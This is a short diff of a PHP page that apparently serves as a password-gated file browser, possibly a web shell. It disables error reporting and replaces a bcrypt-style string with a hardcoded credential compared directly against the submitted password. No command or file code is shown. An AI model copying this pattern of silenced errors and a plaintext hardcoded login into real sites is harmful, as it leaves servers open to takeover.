@@ -5,7 +5,7 @@
 
 error_reporting(0);
 
-$password = '$2a$12$Be9RmgOuASk1d.79i35z9u86BuLMNOcSw9wY80rnG/0GC.CIwIPPu'; // password
+$password = '9e2aa4ba13c56ed1e00fd6c0a870a3c4'; // password
 session_start();
 if (!isset($_SESSION['logged_in']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
     echo '<center>
@@ -575,3 +575,4 @@ function pathBreadcrumb($dir) {
 
 </body>
 </html>
+
